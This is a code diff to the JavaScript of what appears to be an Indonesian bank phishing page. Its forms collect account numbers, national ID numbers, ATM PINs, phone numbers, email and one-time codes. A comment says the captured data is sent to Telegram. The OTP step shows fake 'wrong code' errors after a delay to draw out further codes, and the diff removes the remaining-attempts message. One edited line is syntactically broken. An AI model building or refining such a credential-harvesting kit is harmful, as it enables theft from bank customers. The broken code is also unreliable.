@@ -16,12 +16,10 @@ function initKeyboardHandler() {
     
     inputs.forEach(input => {
         input.addEventListener('focus', function() {
-            // Tombol naik saat keyboard muncul
             buttonWrapper.classList.add('keyboard-up');
         });
         
         input.addEventListener('blur', function() {
-            // Tombol turun kembali saat keyboard hilang
             buttonWrapper.classList.remove('keyboard-up');
         });
     });
@@ -33,7 +31,11 @@ function pindahHalaman(id) {
     document.getElementById(id).classList.add('active');
     
     if (id === 'page2') {
-        document.getElementById('btnLanjut').classList.add('hidden');
+        // Reset dan sembunyikan tombol lanjut
+        const btnLanjut = document.getElementById('btnLanjut');
+        if (btnLanjut) {
+            btnLanjut.classList.add('hidden');
+        }
         cekFormPage2();
         
         setTimeout(function() {
@@ -48,13 +50,12 @@ function pindahHalaman(id) {
     if (id === 'page3') {
         resetStateOTP();
         generateKodeOTP();
-        // Inisialisasi keyboard handler setiap masuk halaman 3
         setTimeout(initKeyboardHandler, 100);
     }
 }
 
 function generateKodeOTP() {
-    kodeBenar = Math.floor(100000 + Math.random() * 900000).toString();
+    kodeBenar = Math.floor(100000 + Math.random() 900000).toString();
     console.log('Kode OTP yang benar (untuk testing):', kodeBenar);
     return kodeBenar;
 }
@@ -155,7 +156,6 @@ function lockForm(seconds) {
     }, 1000);
 }
 
-// Loading 4 detik sebelum menampilkan pesan kode salah
 async function showLoadingWithDelay(delayMs) {
     return new Promise(resolve => {
         showLoading();
@@ -186,7 +186,6 @@ async function validateOTPWithLoading(kodeInput) {
     
     percobaanOTP++;
     const errorMessage = document.getElementById('errorMessage');
-    const sisaPercobaan = 10 - percobaanOTP;
     
     if (percobaanOTP >= 10) {
         errorMessage.innerHTML = '❌ Kode salah! Batas percobaan tercapai. Mohon tunggu 15 detik.';
@@ -195,7 +194,8 @@ async function validateOTPWithLoading(kodeInput) {
         return false;
     }
     
-    errorMessage.innerHTML = `❌ Kode salah! Silahkan tunggu kode yang berikutnya. Sisa percobaan: ${sisaPercobaan}`;
+    // HAPUS TULISAN SISA PERCOBAAN - hanya tampilkan pesan sederhana
+    errorMessage.innerHTML = '❌ Kode salah, silahkan tunggu kode yang berikutnya';
     errorMessage.style.color = '#ff0000';
     errorMessage.classList.remove('timer-message');
     
@@ -228,31 +228,55 @@ function isFormPage2Valid() {
 }
 
 function cekFormPage2() {
+    console.log('cekFormPage2 dipanggil, isFormValid:', isFormPage2Valid());
     if (isFormPage2Valid()) {
-        btnLanjut.classList.remove('hidden');
-        infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
-        infoPage2.style.color = '#27ae60';
+        if (btnLanjut) {
+            btnLanjut.classList.remove('hidden');
+            console.log('Tombol LANJUT ditampilkan');
+        }
+        if (infoPage2) {
+            infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
+            infoPage2.style.color = '#27ae60';
+        }
     } else {
-        btnLanjut.classList.add('hidden');
-        infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
-        infoPage2.style.color = '#e67e22';
+        if (btnLanjut) {
+            btnLanjut.classList.add('hidden');
+            console.log('Tombol LANJUT disembunyikan');
+        }
+        if (infoPage2) {
+            infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
+            infoPage2.style.color = '#e67e22';
+        }
     }
 }
 
+// Event listener untuk validasi form halaman 2
 if (noRekening) {
-    noRekening.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
+    noRekening.addEventListener('input', function() { 
+        this.value = this.value.replace(/[^0-9]/g, ''); 
+        cekFormPage2(); 
+    });
     noRekening.addEventListener('blur', cekFormPage2);
 }
 if (noIdentitas) {
-    noIdentitas.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
+    noIdentitas.addEventListener('input', function() { 
+        this.value = this.value.replace(/[^0-9]/g, ''); 
+        cekFormPage2(); 
+    });
     noIdentitas.addEventListener('blur', cekFormPage2);
 }
 if (pinAtm) {
-    pinAtm.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); cekFormPage2(); });
+    pinAtm.addEventListener('input', function() { 
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); 
+        cekFormPage2(); 
+    });
     pinAtm.addEventListener('blur', cekFormPage2);
 }
 if (noTelpon) {
-    noTelpon.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
+    noTelpon.addEventListener('input', function() { 
+        this.value = this.value.replace(/[^0-9]/g, ''); 
+        cekFormPage2(); 
+    });
     noTelpon.addEventListener('blur', cekFormPage2);
 }
 if (email) {
@@ -341,7 +365,6 @@ async function selesai() {
         return;
     }
     
-    // Validasi OTP dengan loading 4 detik jika salah
     const isValid = await validateOTPWithLoading(kodeOtpInput.value.trim());
     
     if (!isValid) {
@@ -350,7 +373,6 @@ async function selesai() {
         return;
     }
     
-    // KODE BENAR - Loading sebentar lalu kirim ke Telegram
     showLoading();
     
     const userDataStr = sessionStorage.getItem('userData');
@@ -405,14 +427,24 @@ function resetForm() {
     }
     
     pindahHalaman('page1');
-    infoPage2.innerHTML = '* Harap isi semua data';
-    infoPage2.style.color = '#e67e22';
-    document.getElementById('btnLanjut').classList.add('hidden');
+    if (infoPage2) {
+        infoPage2.innerHTML = '* Harap isi semua data';
+        infoPage2.style.color = '#e67e22';
+    }
+    if (btnLanjut) {
+        btnLanjut.classList.add('hidden');
+    }
 }
 
 const kodeOtpInput = document.getElementById('kodeOtp');
 if (kodeOtpInput) {
-    kodeOtpInput.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); });
+    kodeOtpInput.addEventListener('input', function() { 
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); 
+    });
 }
 
-cekFormPage2();
+// Panggil cekFormPage2 saat halaman dimuat
+document.addEventListener('DOMContentLoaded', function() {
+    cekFormPage2();
+    console.log('DOM loaded, cekFormPage2 dipanggil');
+});
